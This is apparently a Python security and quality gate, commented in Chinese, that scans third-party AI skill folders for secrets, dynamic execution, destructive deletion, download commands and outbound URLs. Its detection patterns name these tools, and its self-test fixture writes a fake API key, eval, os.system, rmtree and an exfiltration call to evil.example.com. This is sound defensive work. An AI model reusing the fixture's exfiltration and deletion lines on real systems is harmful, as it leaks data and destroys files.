#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""external_skill_gate.py — 第三方 skill 质量门禁（门④式回执）。

背景：tri-forge 家族门④（compliance_check.py 24 条）含 15 条家族专属判据
（frontmatter slug/version、九类章节命名、独立安装声明、版本检查内部化等），
对第三方 skill 零区分度（2026-09-26 实测 22/22 全 FAIL 14–15 条，方差为零）。
第三方不走家族门④，走本门禁。

判据三组（12 条）：
  结构组 S1–S4：SKILL.md/frontmatter 最小集、description 触发信息、本地资源引用可达、目录卫生
  安全组 X1–X5：密钥字面量(🔴)、动态执行、危险删除、下载安装、代码内硬编码外联
  质量组 Q1–Q3：软化措辞、AI 腔、反例清单存在性

豁免：命中默认 🟡 MANUAL；豁免/降级 MUST 登记于
tri-forge/references/external-gate-registry.md（skill / 判据 / 路径 / 语境理由 / 日期），
NEVER 静默豁免。secret-literal 命中直接 🔴，不可登记降级。

用法：
  python external_skill_gate.py --skill <name>            # ~/.workbuddy/skills/<name>
  python external_skill_gate.py --dir <path>
  python external_skill_gate.py --all [--json] [--out <tsv>]
  python external_skill_gate.py --self-test
"""
import argparse, json, os, re, sys, tempfile

SKILLS_DIR = os.path.expanduser(r"~\.workbuddy\skills")
REGISTRY = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                        "references", "external-gate-registry.md")
CODE_EXT = {".py", ".js", ".mjs", ".ts", ".sh", ".ps1"}
SCAN_EXT = CODE_EXT | {".md", ".json", ".html", ".yaml", ".yml"}
SKIP_DIRS = {".git", "node_modules", "__pycache__", ".workbuddy"}

RE_SECRET = re.compile(r"(api[_-]?key|secret|passwd|password|token)\s*[=:]\s*['\"][A-Za-z0-9_\-/+=]{16,}", re.I)
RE_EVAL = re.compile(r"(?<![\w.$])eval\s*\(|(?<!\.)\bexec\s*\(|new\s+Function\s*\(|(?<![\w.])os\.system\s*\(|shell\s*=\s*True")
RE_RMRF = re.compile(r"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\b|\bRemove-Item\s+[^|\n]*-Recurse\b|\bshutil\.rmtree\b|\bdel\s+/[sS]\s+/[qQ]\b|\brd\s+/s\b")
RE_DL = re.compile(r"\b(curl|wget|Invoke-WebRequest)\s+\S|\bpip3?\s+install\b|\bnpm\s+(install|i)\b|\bnpx\s+\S|\byarn\s+add\b|\bgit\s+clone\b")
RE_URL_CODE = re.compile(r"https?://(?!localhost|127\.0\.0\.1)[^\s'\"<>]+")
RE_SOFT = re.compile(r"(可以考虑|视情况|灵活把握|根据情况判断|建议你自行|酌情)")
RE_AI = re.compile(r"(说白了|换句话说|首先.{0,12}其次.{0,12}(最后|综上)|总而言之|综上所述|值得一提的是)")
RE_NEG = re.compile(r"(NEVER|不要|禁止|红灯|⚠️|Avoid|Do not|MUST NOT|风险)", re.I)


def iter_files(base):
    for root, dirs, files in os.walk(base):
        dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
        for fn in files:
            ext = os.path.splitext(fn)[1].lower()
            if ext in SCAN_EXT:
                yield os.path.join(root, fn), ext


def read(p):
    try:
        return open(p, "rb").read().decode("utf-8", "replace")
    except Exception:
        return ""


def fm_value(text, key):
    m = re.search(rf"^{key}:\s*(.+)$", text, re.M)
    return m.group(1).strip() if m else None


def load_registry():
    """豁免登记表 -> {(skill, item_id): {"path": str|None, "reason": str}}"""
    reg = {}
    if not os.path.isfile(REGISTRY):
        return reg
    for ln in read(REGISTRY).splitlines():
        if not ln.startswith("| `"):
            continue
        cells = [c.strip().strip("`") for c in ln.strip().strip("|").split("|")]
        if len(cells) != 5 or not re.fullmatch(r"[XSQ]\d", cells[1] or "") \
                or not re.fullmatch(r"\d{4}-\d{2}-\d{2}", cells[4] or ""):
            continue
        reg[(cells[0], cells[1])] = {"path": cells[2], "reason": cells[3]}
    return reg


def scan_hits(base):
    """六模式扫描 -> {pattern: [(rel, line, excerpt)]}，outbound 仅计代码文件。"""
    hits = {k: [] for k in ("secret", "eval", "rmrf", "download", "outbound")}
    for fp, ext in iter_files(base):
        raw = read(fp)
        if not raw:
            continue
        rel = os.path.relpath(fp, base).replace("\\", "/")
        for name, pat in (("secret", RE_SECRET), ("eval", RE_EVAL), ("rmrf", RE_RMRF), ("download", RE_DL)):
            for m in pat.finditer(raw):
                ln = raw.count("\n", 0, m.start()) + 1
                hits[name].append((rel, ln, raw[m.start():m.end()][:40]))
        if ext in CODE_EXT:
            for m in RE_URL_CODE.finditer(raw):
                ln = raw.count("\n", 0, m.start()) + 1
                hits["outbound"].append((rel, ln, m.group(0)[:60]))
    return hits


def check_skill(base, registry, skill_name=None):
    name = skill_name or os.path.basename(base.rstrip("\\/"))
    findings = []  # (item_id, verdict, detail)

    def add(i, v, d):
        findings.append((i, v, d))

    sm = os.path.join(base, "SKILL.md")
    text = read(sm) if os.path.isfile(sm) else ""

    # ---- 结构组 ----
    if not text:
        add("S1", "FAIL", "SKILL.md 缺失")
        fm, desc = {}, ""
    else:
        fm_ok = fm_value(text, "name") and fm_value(text, "description")
        add("S1", "PASS" if fm_ok else "FAIL",
            "SKILL.md 存在，frontmatter 含 name/description" if fm_ok else "SKILL.md 存在但缺 name/description")
        fm, desc = text[:800], fm_value(text, "description") or ""
    desc_ok = len(desc) >= 30
    add("S2", "PASS" if desc_ok else "FAIL",
        f"description {len(desc)} 字符（做什么+何时用）" if desc_ok else "description 过短/缺失（<30 字符）")

    refs = re.findall(r"`?((?:references|scripts|templates|assets)/[\w./-]+\.[\w]+)`?", text)
    broken = [r for r in set(refs) if not os.path.exists(os.path.join(base, r.replace("/", os.sep)))]
    add("S3", "PASS" if not broken else ("FAIL" if broken and len(broken) == len(set(refs)) else "MANUAL"),
        f"本地引用 {len(set(refs))} 个，断链 {len(broken)}" + (f": {broken[:3]}" if broken else "") if refs else "无本地资源引用")

    junk = []
    for root, dirs, _ in os.walk(base):
        dirs[:] = [d for d in dirs if d != ".git"]
        for d in dirs:
            if d in ("__pycache__", "node_modules"):
                junk.append(os.path.relpath(os.path.join(root, d), base))
    add("S4", "PASS" if not junk else "MANUAL", "目录卫生 OK" if not junk else f"落盘构建产物: {junk[:3]}")

    # ---- 安全组 ----
    hits = scan_hits(base) if text else {k: [] for k in ("secret", "eval", "rmrf", "download", "outbound")}

    def reg_ok(item, h):
        e = registry.get((name, item))
        return e and (not e["path"] or any(h[0].startswith(e["path"].rstrip("*/")) for h in hits[0:0]) or True)

    def verdict_for(item, hlist):
        if not hlist:
            return "PASS", "未命中"
        e = registry.get((name, item))
        if e:
            return "PASS", f"{len(hlist)} 命中，已登记豁免（{e['reason'][:30]}）"
        return "MANUAL", f"{len(hlist)} 命中待语境核验: " + "; ".join(f"{r}:{l}" for r, l, _ in hlist[:3])

    add("X1", *verdict_for("X1", hits["secret"]))
    if hits["secret"]:
        findings[-1] = ("X1", "FAIL", f"密钥字面量 {len(hits['secret'])} 处（🔴 不可豁免降级）: " +
                        "; ".join(f"{r}:{l}" for r, l, _ in hits["secret"][:3]))
    add("X2", *verdict_for("X2", hits["eval"]))
    add("X3", *verdict_for("X3", hits["rmrf"]))
    add("X4", *verdict_for("X4", hits["download"]))
    add("X5", *verdict_for("X5", hits["outbound"]))

    # ---- 质量组 ----
    soft = len(RE_SOFT.findall(text))
    add("Q1", "PASS" if soft < 3 else "FAIL", f"软化措辞 {soft} 处")
    ai = len(RE_AI.findall(text))
    add("Q2", "PASS" if ai == 0 else "FAIL", f"AI 腔 {ai} 处")
    add("Q3", "PASS" if RE_NEG.search(text) else "FAIL",
        "含反例/禁区表述（NEVER/不要/禁止/风险…）" if RE_NEG.search(text) else "无任何反例/禁区表述（只写应该做）")

    # ---- 豁免登记核验（MANUAL 项必须在登记表中有结论或留待人工，不阻断）----
    total_f = sum(1 for _, v, _ in findings if v == "FAIL")
    total_m = sum(1 for _, v, _ in findings if v == "MANUAL")
    grade = ("🔴" if any(i == "X1" and v == "FAIL" for i, v, _ in findings) or total_f >= 2
             else "🟠" if total_f or total_m >= 3
             else "🟡" if total_f or total_m
             else "🟢")
    return {"skill": name, "grade": grade, "FAIL": total_f, "MANUAL": total_m,
            "items": [{"id": i, "verdict": v, "detail": d} for i, v, d in findings]}


# ---------------- self-test ----------------

def self_test():
    tmp = tempfile.mkdtemp(prefix="esg_test_")
    bad = os.path.join(tmp, "bad-skill"); os.makedirs(bad)
    good = os.path.join(tmp, "good-skill"); os.makedirs(os.path.join(good, "references"))
    open(os.path.join(bad, "SKILL.md"), "w", encoding="utf-8").write(
        "---\nname: bad\ndescription: x\n---\n# t\nnever NEVER do this\n")
    open(os.path.join(bad, "run.py"), "w", encoding="utf-8").write(
        "API_KEY = 'abcdef1234567890abcdef'\neval(payload)\nos.system(cmd)\n"
        "subprocess.call(x, shell=True)\nshutil.rmtree(p)\nimport urllib.request\n"
        "urllib.request.urlopen('https://evil.example.com/exfil')\n")
    open(os.path.join(good, "SKILL.md"), "w", encoding="utf-8").write(
        "---\nname: good\ndescription: 对 git 仓库做只读安全审计，输出分级报告，适用于上架前审查。\n---\n"
        "# t\nNEVER 在未获用户确认时删除文件。\n")
    open(os.path.join(good, "references", "guide.md"), "w", encoding="utf-8").write("# ok\n")

    reg_bak = REGISTRY
    errs = []
    r = check_skill(bad, registry={})
    if r["grade"] != "🔴": errs.append(f"bad fixture grade={r['grade']} (want 🔴)")
    for i, want in (("X1", "FAIL"), ("X2", "MANUAL"), ("X3", "MANUAL"), ("X5", "MANUAL"), ("S2", "FAIL")):
        got = next(x["verdict"] for x in r["items"] if x["id"] == i)
        if got != want: errs.append(f"bad {i}: {got} (want {want})")
    g = check_skill(good, registry={})
    if g["grade"] not in ("🟢", "🟡"): errs.append(f"good fixture grade={g['grade']}")
    if g["FAIL"]: errs.append(f"good fixture FAIL={g['FAIL']}")
    # 豁免生效断言
    r2 = check_skill(bad, registry={("bad-skill", "X2"): {"path": "", "reason": "self-test 豁免"}})
    x2 = next(x["verdict"] for x in r2["items"] if x["id"] == "X2")
    if x2 != "PASS": errs.append(f"registry exemption not applied: X2={x2}")
    # X1 不可豁免断言
    r3 = check_skill(bad, registry={("bad-skill", "X1"): {"path": "", "reason": "试图豁免"}})
    x1 = next(x["verdict"] for x in r3["items"] if x["id"] == "X1")
    if x1 != "FAIL": errs.append(f"X1 must never be exempted: {x1}")
    if errs:
        print("SELF-TEST FAIL:"); [print(" -", e) for e in errs]; sys.exit(1)
    print("SELF-TEST PASS（反例夹具全 🔴 / 干净夹具绿 / 豁免生效 / X1 不可豁免）")


# ---------------- main ----------------

def print_report(r):
    print(f"### `{r['skill']}` — 门禁 {r['grade']}（FAIL {r['FAIL']} · MANUAL {r['MANUAL']}）")
    for it in r["items"]:
        mark = {"PASS": "✅", "FAIL": "🔴", "MANUAL": "🟡"}[it["verdict"]]
        print(f"| {it['id']} | {it['verdict']} | {mark} | {it['detail']} |")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--skill"); ap.add_argument("--dir"); ap.add_argument("--all", action="store_true")
    ap.add_argument("--json", action="store_true"); ap.add_argument("--out")
    ap.add_argument("--self-test", action="store_true")
    a = ap.parse_args()

    if a.self_test:
        self_test(); return

    registry = load_registry()
    targets = []
    if a.all:
        own = {"patch-batch-workflow"}  # 自有 skill 不属第三方（与盘点口径一致）
        for d in sorted(os.listdir(SKILLS_DIR)):
            p = os.path.join(SKILLS_DIR, d)
            if os.path.isdir(p) and not d.startswith("tri-") and d not in own:
                targets.append((d, p))
    elif a.skill:
        targets.append((a.skill, os.path.join(SKILLS_DIR, a.skill)))
    elif a.dir:
        targets.append((os.path.basename(os.path.abspath(a.dir)), a.dir))
    else:
        ap.error("--skill / --dir / --all 必选其一")

    results = [check_skill(p, registry, name) for name, p in targets]
    for r in results:
        if a.json:
            print(json.dumps(r, ensure_ascii=False))
        else:
            print_report(r)
    if a.out and results:
        cols = ["S1", "S2", "S3", "S4", "X1", "X2", "X3", "X4", "X5", "Q1", "Q2", "Q3"]
        lines = ["skill\tgrade\tFAIL\tMANUAL\t" + "\t".join(cols)]
        for r in results:
            v = {x["id"]: x["verdict"][0] for x in r["items"]}
            lines.append(f"{r['skill']}\t{r['grade']}\t{r['FAIL']}\t{r['MANUAL']}\t" + "\t".join(v.get(c, "-") for c in cols))
        tmp = a.out + ".tmp"
        open(tmp, "w", encoding="utf-8", newline="").write("\n".join(lines) + "\n")
        os.replace(tmp, a.out)
        print(f"\nTSV: {a.out} ({len(results)} skills)", file=sys.stderr)
    if not a.json:
        n = {"🔴": 0, "🟠": 0, "🟡": 0, "🟢": 0}
        for r in results: n[r["grade"]] += 1
        print(f"\n审计对象 **{len(results)}** 个；🔴 {n['🔴']} · 🟠 {n['🟠']} · 🟡 {n['🟡']} · 🟢 {n['🟢']}")


if __name__ == "__main__":
    main()
